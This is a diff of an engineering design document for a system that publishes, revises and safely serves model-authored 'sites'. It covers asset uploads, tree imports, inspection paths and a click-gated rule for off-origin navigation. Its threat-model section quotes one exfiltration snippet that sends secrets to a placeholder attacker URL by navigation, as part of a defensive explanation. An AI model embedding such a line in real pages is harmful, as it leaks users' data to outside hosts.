@@ -32,7 +32,6 @@ exists.
 | `apps/api/src/artifacts/asset-loopback.ts` | `ArtifactAssetLoopback`: the `ASSETS` binding, as an exported entrypoint. The one thing that crosses into an artifact's isolate. |
 | `apps/api/src/artifacts/asset-shim.ts` | The two module sources that run inside the isolate: the wrapper that makes `fetch(string)` true, and the entry Rally puts in front of a stateless active site's own module. |
 | `apps/api/src/artifacts/pages.ts` | The neutral page, the plain error page, and the fragment-to-cookie bootstrap. |
-| `apps/api/wrangler.artifacts.{global,eu}.jsonc` | The serving Workers: wildcard route, platform D1 index, cross-script DO binding, loader, bucket. |
 | `apps/api/src/services/workstream-artifact-data-tools.ts` | The two read-only data tools' contract: what a model sees, and which sites are unreachable. No `Env` — its wiring is next door. |
 | `apps/api/src/services/workstream-artifact-data-wiring.ts` | Resolving a reference through the standard visibility loader, and reaching the supervisor through the one supported resolver. |
 | `packages/agent-harness/src/prompts/document-generation.ts` | The standing policy's `# Sites` section: the trigger and the manners, and nothing else. |
@@ -40,13 +39,11 @@ exists.
 | `apps/api/src/services/artifact-open-service.ts` | The identity-bearing door into an artifact origin: the open-time visibility check and the fragment-carrying URL it mints. Public reads bypass it and remain anonymous. |
 | `apps/desktop/src/renderer/components/site-resource-detail.tsx` | The site detail: the pane it measures and hands over, the actions it puts in its host's header, and the Data view. |
 | `apps/desktop/src/renderer/components/detail-header-actions.tsx` | The slot a rail or lightbox offers in its header, and the portal any detail fills it through. Not artifact-specific: it is what keeps this detail's controls out of the page it is showing. |
-| `apps/desktop/src/main/artifact-viewers.ts` | What the desktop will load into an artifact surface, the preview rectangle's clamp and corner, the shared isolation contract, and the overlay rule. |
-
-## How it works
+| `apps/desktop/src/main/artifact-viewers.ts` | What the desktop will load into an artifact surface, the preview rectangle's clamp and corner, the shared isolation contract, the activation gate on leaving the origin, and the overlay rule. |
 
 ### Publishing
 
-`terminal_publish_resource` accepts a directory. It gains no parameter for what
+`publish_resource` accepts a directory. It gains no parameter for what
 to do with one: **the kind is resolved from the directory's root entry**, because
 a parameter restating what the files already say is a parameter that can disagree
 with them, and the disagreement would be invisible until serve time.
@@ -86,19 +83,44 @@ The bitmap font transliterates accented Latin text and gives titles with no
 supported glyphs a stable visible site code; an authored card remains the right
 answer for non-Latin branding.
 
+Assets within a version upload through at most six whole-upload workers. That is
+a conservative per-invocation budget based on Cloudflare's six connections
+waiting for response headers; it is neither a hard transfer cap nor an
+account-wide limit. Every writer settles before publication can continue; any
+failed asset prevents the manifest write. This preserves the assets-before-manifest
+barrier without adding each independent R2 round trip to the publication latency.
+
 ### Revising
 
 A run asked to change a site it did not build — or built in a session that has
-since ended — brings the files back first. The manifest is the index, and
-`index.js` is materialized alongside the assets even though a viewer's request
-for it 404s: "module, not asset" is a rule about the *serving* path, and a model
-that could not see its own server could not revise it.
+since ended — brings the files back first, through `import_resource`
+on the site's own resource id. The manifest is the index, and `index.js` is
+materialized alongside the assets even though a viewer's request for it 404s:
+"module, not asset" is a rule about the *serving* path, and a model that could
+not see its own server could not revise it. The version imported is the one the
+resource points at, so an edit starts from what viewers are being served rather
+than from whatever an earlier sandbox happened to hold.
+
+**A site import names its destination.** The deterministic placement that gives
+a file import its provenance — a fixed path, a digest, a reuse when they match —
+has nothing to match against for a tree, and the path a site wants is not
+Rally's to pick: it is the one the site publishes from, because republishing
+exactly that path is what updates this site instead of minting a second one at a
+second URL. An import that omits `destinationPath` is therefore refused with
+that path, `.rally-output/<source path>`, spelled from the workspace root the
+import measures from rather than the output directory publication measures
+from.
 
 `overwrite` is **whole-tree replacement, never a merge**. Merging would leave
 behind files a later version deleted, and the next publish would ship them back
 as though somebody had restored them on purpose. The tree is staged beside the
-destination and moved into place, so a failure partway leaves the previous tree
-intact.
+destination, the existing directory is renamed aside rather than deleted, and
+the staged tree is moved into place — so an install that fails puts the previous
+tree back, and only an install that succeeded removes it. A refusal costs
+nothing: the destination is inspected while the staging directory is created,
+before any durable import row exists and before a byte moves, because a
+`planned` row that outlives a refused call reads to the next acquisition as a
+revoked import and replaces the whole sandbox.
 
 The one manifest asset source import deliberately omits is a preview marked
 `generated: true`. It is Rally's derived output, not model-authored source;
@@ -194,6 +216,11 @@ become unreachable from later opens. Artifacts currently use Rally's server-side
 data surface for durable state, so preserving that browser-local state was not
 worth retaining UUID origins for newly opened sessions.
 
+Data-table and error-log inspection use the same registry and current parent
+visibility checks as navigation, but do not load a viewer profile or mint a
+browser bootstrap code. Only actual navigation calls `openForViewer`. Inspection
+also does not migrate legacy hostnames: it addresses the artifact object by ID.
+
 ### Stateful artifacts
 
 A site whose `index.js` exports `class SiteData extends DurableObject` gets its
@@ -287,19 +314,37 @@ is the only place that can forward into it.
   root-scoped service worker is the single thing an artifact can install that
   answers requests without reaching Rally at all — defeating revocation, the
   current-version guarantee, and the offline message in one move.
-- **Nothing an artifact composes is handed to the system browser.** An
-  off-origin navigation is refused, not opened externally: `location = "https://
-  attacker/?" + secrets` is a navigation, which `connect-src` and `form-action`
-  do not touch, and opening it would make Rally perform the exfiltration the
-  egress fence exists to prevent. **In a plain browser tab that channel stays
-  open**, and no header closes it — CSP has no directive over where a document
-  navigates itself. So the egress fence is honestly two claims, not one: no
-  artifact can *fetch, load, beacon, or post* off-origin anywhere, and in
-  Rally's own surfaces it cannot navigate off-origin either. A page opened in
-  a browser can still put what it can see into a URL bar the person watches it
-  land in — which is the reason the desktop refuses rather than hands off, and
-  the reason this is written down rather than left as an assumed property of
-  the CSP.
+- **An artifact leaves its origin only through a person's own press, and never
+  in place.** `location = "https://attacker/?" + secrets` is a navigation, which
+  `connect-src` and `form-action` do not touch, so an unattended off-origin
+  navigation is dropped: no timer, no `onload`, no cursor passing over the page
+  reaches the system browser. Under transient user activation — a press or a tap
+  on that surface within the five seconds Chromium itself calls activation — an
+  `http(s)` link is handed to the default browser instead, and the preview never
+  follows it in place, because a pane that says it is showing the artifact must
+  not be showing something else. **The departure spends the press**, as
+  `window.open` spends it in a browser, so one click buys one departure rather
+  than a five-second licence: a page answering a click with a loop of
+  `window.open` calls gets its first URL opened and no more. A redirect is not a
+  press, is refused whatever the activation says, and spends nothing; the
+  destination of a `302` is not the URL somebody chose to follow. **A press
+  belongs to the document that received it** and is dropped when a main-frame
+  navigation commits, so a click on an in-site link cannot still be live when
+  the next page's `onload` runs. A `target="_blank"` link never gets a second
+  window: off-origin it goes through the gate like any other link, and
+  same-origin it is shown in the surface already open, which is the only answer
+  that keeps the viewer session.
+  **What this closes and what it does not** is the whole of the claim, and is
+  written down rather than left as an assumed property of the CSP. No artifact
+  can *fetch, load, beacon, or post* off-origin anywhere — that fence is whole.
+  Navigation is narrower: unattended exfiltration by navigation is closed in
+  Rally's surfaces, but a person clicking `Read the docs →` cannot see where the
+  link points, so a page that wants to leak through a click still can, in
+  exactly the way it can in a plain browser tab, where no header closes the
+  channel at all. The gate buys that every handoff is somebody's own press, and
+  that a press buys exactly one. It does not buy that the URL is one they would
+  have chosen, and one URL per press is still a channel — a narrow one, paid for
+  a click at a time.
 - **The asset manifest is the only index.** Nothing resolves a path the manifest
   does not name, which is what makes the server module's absence from `assets` a
   real 404 rather than a convention.
@@ -413,12 +458,13 @@ facet that holds a stateful artifact's data. It does not own:
 | `pnpm --filter @rally/api exec vitest run test/terminal-runtime.test.ts` | Directory publish end to end through the runtime, against a simulated sandbox shell. |
 | `pnpm --filter @rally/api exec vitest run test/artifact-open-service.test.ts` | Which authority answers which question at open time, that a refusal mints nothing, and that a missing artifact and an invisible one are indistinguishable. |
 | `pnpm --filter @rally/desktop exec vitest run src/renderer/components/site-resource-detail.test.tsx` | The detail: that it measures and hands over rather than embedding, that its actions land in the host's header and each carries a tooltip, that Copy link carries no code, that the data toggle only exists for a site that keeps data and takes the composited view down with it, and that the pane never flashes its unavailable state. |
-| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-viewers.test.ts` | What the desktop will load, the rectangle clamp, the isolation contract, the overlay collapse, and the teardown guards — each surface's lifecycle branch separately, since one guard covering both reads as covered while half of it is dead. |
-| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-preview-wiring.test.ts` | The per-window registry in `index.ts`, which the controller's own suite cannot see: one controller and so one `closed` listener per window, the entry removed only by that listener, and the adapter reporting lifecycle rather than assuming it. |
+| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-viewers.test.ts` | What the desktop will load, the rectangle clamp, the isolation contract, the activation gate (unattended navigation dropped, an activated link handed over and never followed in place, redirects and disallowed schemes refused either way, one press buying one departure and not a loop of them, a refused navigation leaving the press unspent, the press dropped when its document goes, a same-origin `_blank` shown in place, and the exact event set that does and does not arm it), the overlay collapse, and the teardown guards — each surface's lifecycle branch separately, since one guard covering both reads as covered while half of it is dead. |
+| `pnpm --filter @rally/desktop exec vitest run src/main/artifact-preview-wiring.test.ts` | The per-window registry in `index.ts`, which the controller's own suite cannot see: one controller and so one `closed` listener per window, the entry removed only by that listener, the adapter reporting lifecycle rather than assuming it, each artifact surface being confined with an activation tracker built from its own input stream, the consuming call rather than the peeking one reaching the fence, the press being dropped on `did-navigate`, and the external opener's rejection being caught. |
 | `pnpm --filter @rally/api exec vitest run test/workstream-artifact-data-tools.test.ts` | The data tools' contract and the site read-remediation, including its round trip through the real structured-failure sanitizer. |
 | `pnpm --filter @rally/agent-harness exec vitest run` | The skill's shape and the standing policy's byte budget — the prompt bound is what keeps the policy six lines rather than nine. |
 | `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-stateless-module.test.ts` | A **stateless active** site's isolate on real workerd: that the `ASSETS` stub crosses the loader's env at all, that it serves this artifact's files, that the relative-string read works, and that `fetch()` throws. Scope is the isolate contract, not admission — the fences in front of it are the policy suite's. |
 | `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-social-preview-runtime.test.ts` | `HTMLRewriter` on real workerd: active HTML receives metadata without buffering, while protected errors and JSON remain exact. |
+| `pnpm --filter @rally/api exec vitest run --config vitest.workers.config.ts test-workers/artifact-asset-uploads.test.ts` | Real-R2 asset upload overlap, the assets-before-manifest barrier, generated tail assets, and failure draining. |
 | `pnpm --filter @rally/api test:workers` (`test-workers/artifact-facet.test.ts`) | The facet on **real workerd**: a model class running with its own SQLite, viewer attribution and deduplication, rows surviving a republish, isolation between two artifacts and from the supervisor's own tables, egress throwing, and the rollback. |
 
 Two traps:
@@ -445,7 +491,7 @@ Two traps:
 - Shared platform D1 `artifact_hostname_routes`: `region`, `hostname_stub`,
   `artifact_id`, `created_at`. It contains no workspace, user, session, or
   artifact content.
-- `ArtifactHostDO` (both regions, jurisdiction-pinned): `artifact_state` (one
+- `ArtifactHostDO` (configured deployments, jurisdiction-pinned): `artifact_state` (one
   row), `viewer_sessions` (digests only — the cookie value is never stored), and
   `error_log` (a bounded ring).
 - The `"data"` facet, for stateful artifacts: the model's schema, in a database
@@ -454,17 +500,6 @@ Two traps:
 - R2 `PAYLOADS`: `artifact/<id>/v<n>/assets/<path>` and `…/manifest.json`.
   New manifests optionally carry a `socialPreview` descriptor; generated cards
   are ordinary versioned assets beneath that same prefix.
-
-## Regional impact
-
-Serving content is region-distinct end to end. The two wildcard hosts route to their own
-region's Worker (`*-g` and `*-eu`), so an EU artifact's bytes never transit a
-Global Worker and no cross-region bridge is added. An artifact's assets,
-manifest, stored data, sessions, and error log all rest in its workspace's
-region. Only the opaque stub-to-artifact-UUID row is platform-shared; it carries
-no content or participant identity. The EU half is deployed dark and accepts no
-traffic until EU Terminal ships, because nothing can publish an EU artifact
-before then.
 
 ## Security and trust model
 
@@ -480,7 +515,154 @@ data tools, publication, and revision remain work-stream-authorized. A
 compromise of the serving Worker exposes artifact content and viewer sessions
 rather than workspace authority.
 
-## Changelog
+### 2026-09-13 — The revision loop's import half is connected
+
+**What changed:** `import_resource` branches on `generated_site` and
+materializes the version's tree — `readArtifactVersionFiles` for the bytes, a
+staged directory for the upload, `materializeTreeCommand` to move it into place,
+`importTreeFailure` for the exit codes. All four already existed in
+`site-import.ts`; nothing called them. The output reports `fileCount` beside the
+directory root in `filePath`, and an import that omits `destinationPath` is
+refused with the site's own publish path rather than placed automatically.
+
+**Why:** Rally could publish a site and never edit it again. The import fell
+through to the single-file path, which fetches the one object at the resource's
+`content_ref` — for a site that is the manifest, so a run asking for its own
+source received the JSON index of it. The only revision left was to rewrite the
+site from memory and republish, which keeps the URL but is not a revision of
+what is being served: every unremembered detail silently disappears from the
+next version. The tool description, `docs/agent-tools.md`, and the sites skill
+had all specified this behavior; only the caller was missing.
+
+**Considered and rejected:** *A separate `import_site` tool*, which would split
+one question — put this resource in my workspace — across two names the model
+has to choose between, when the existing schema already carries a directory
+destination and a whole-tree `overwrite`. *Defaulting a site to
+`.rally/resources/<id>/resource`*, which materializes a tree at a path that
+cannot be republished, so the first thing the run learns about its site is a
+path that mints a second one.
+
+**What a future change has to respect:** the import is whole-tree replacement
+and the publish path is the identity. Anything that changes where a site
+materializes has to keep those two the same path, or a revision becomes a fork
+with a live URL pointing at the version nobody edits. Two orderings inside it
+are load-bearing, both found in review: a refusal is raised before the durable
+`planned` row, because the next acquisition reads any import row that is not
+`completed` as a revoked resource and replaces the sandbox — so a call that
+changed nothing would cost the work stream its files; and the destination is
+renamed aside rather than deleted, because `rm -rf` followed by a move that
+fails had already destroyed the tree it was replacing, local edits included.
+
+### 2026-09-12 — Inspect artifacts without creating navigation grants
+
+**What changed:** Data and error reads now use a shared authorized resolver
+instead of the complete navigation flow. The resolver retains the registry and
+parent visibility checks, while navigation alone performs the profile read,
+hostname migration, and single-use-code creation.
+
+**Why:** Inspection was paying for those navigation-only operations despite
+never redeeming the resulting code; this showed up on the artifact data and
+error-read path as avoidable latency and unused viewer grants.
+
+**Considered and rejected:** Skipping authorization or caching visibility was
+rejected because each inspection must ask the current parent authority.
+
+**Consequences:** Only `open` may create a viewer session or migrate a hostname.
+Any future operation that needs either effect must go through `open`; inspection
+callers must stay on `resolveAuthorized`. Expired viewer sessions are therefore
+pruned on navigation rather than on inspection, which creates no sessions to
+consume them.
+
+Shipped in #731.
+
+### 2026-09-12 — Overlap independent artifact asset writes
+
+**What changed:** Asset writers now share the platform's six-connection ceiling,
+stop claiming new assets after a failed write, and all settle before the manifest
+is written.
+
+**Why:** Serial R2 writes made multi-file publication pay every asset's network
+latency in succession. Independent versioned asset keys do not need that
+serialization.
+
+**Considered and rejected:** Unbounded fan-out was rejected because it would
+only queue inside the platform; early manifest publication was rejected because
+it could expose an incomplete version.
+
+**Consequences:** Six is a conservative whole-upload worker budget derived from
+Cloudflare's per-invocation header-phase connection ceiling; it is neither a
+hard transfer cap nor an account-wide limit. Any writer added to this path runs
+beside five siblings and must settle before the assets-before-manifest barrier
+can continue.
+
+Shipped in #732.
+
+### 2026-09-11 — A link in a site preview leaves through the person who clicked it
+
+**What changed:** `confineToArtifactOrigin` now takes a link-handoff capability
+and decides with it. An off-origin navigation is still never followed in place,
+but under transient user activation it is handed to the default browser instead
+of dropped — for both artifact surfaces, and for a `target="_blank"` link, which
+leaves through the same gate without a second window being made — or, when it
+points at the site's own origin, is shown in the surface already open. The
+departure spends the activation, so one press admits one departure, and a
+committed main-frame navigation drops it, so a press belongs to the document
+that received it. Activation is
+reconstructed per surface in the main process from Electron's `input-event`
+stream, because nothing tells the main process about activation when a
+navigation starts. Redirects and schemes outside the process's `http(s)` policy
+are refused whatever the activation says, and spend nothing.
+
+**Why:** The previous rule refused every off-origin navigation and handed it
+nowhere, so a dashboard full of links was a page whose links did nothing at all
+and the only recourse was to copy a URL out of a view that cannot be selected
+from. That cost was accepted on the reasoning that the URL is model-composed and
+handing it over makes Rally perform the exfiltration the egress fence exists to
+prevent. That reasoning is still right about the *unattended* case and is what
+the gate keeps: nothing reaches the browser without a press, so no timer, no
+`onload`, and no cursor passing over the page gets there. It was never a
+complete defence of the attended case — a person cannot read where a link points
+before following it — and paying for a partial defence with every working link
+was the wrong trade once sites became something people are meant to use.
+
+**Considered and rejected:** Opening every off-origin navigation, which is the
+simple reading of the request and removes the fence entirely: a page could then
+send itself away with nobody present, which is the one case the gate is cheap to
+keep closed. Treating activation as a five-second window of permission rather
+than something a departure spends, which was the first shape written here and
+was wrong in a way worth recording: `window.open` is called per invocation, so a
+page answering one click with a loop would have put an unbounded number of URLs
+— and so an unbounded amount of what it can see — through the system opener,
+out of a press the person thought followed one link. Letting a press outlive its
+document, which was the same mistake in the other direction: a same-origin
+navigation does not spend the activation, so a click on an ordinary in-site link
+stayed live into the next page, whose `onload` could spend it on a destination
+nobody saw — an unattended handoff, which is the one thing the gate exists to
+refuse. Dropping a same-origin `target="_blank"` link, which left an ordinary
+class of in-site links doing visibly nothing; handing it to the browser instead
+was rejected because a protected site opened there carries no viewer session and
+answers 401. Accepting every representation of a press — `mouseUp`, `keyUp`,
+`char`, `touchStart` — which armed on a press begun off this surface and on a
+touch the person went on to cancel, making the boundary wider than the rule it
+claims to reconstruct. A confirmation dialog showing the destination, which does close the
+attended case — the only thing that does — but puts a modal in front of every
+link on a dashboard; it remains the upgrade if a leak through a click ever
+stops being theoretical. Honouring activation on `will-redirect`, which hands
+the gate back to the page, since a model-authored handler answers requests on
+this origin and can redirect a same-origin click anywhere.
+
+**Consequences:** Deciding and spending are one step — `decideArtifactNavigation`
+takes a `takeActivation` callback rather than a boolean — because a caller handed
+a boolean can forget to consume it, and the failure that follows is silent and
+unbounded. The five-second lifespan is transcribed from Chromium's
+`blink::UserActivationState::kActivationLifespan` rather than chosen here, so
+Rally and the page agree about when somebody is acting; a different span would
+make them disagree and is not a free number to change. The gate is only as good
+as the input stream feeding it — a new artifact surface that forgets
+`artifactLinkHandoff` gets an activation that never fires, so every link on it
+silently stops working, which the wiring test is there to catch. Anything that
+widens this further has to say, as the invariant now does, what it closes and
+what it does not.
 
 ### 2026-09-11 — The page's corner is the pane's, and the pane's host decides it
 
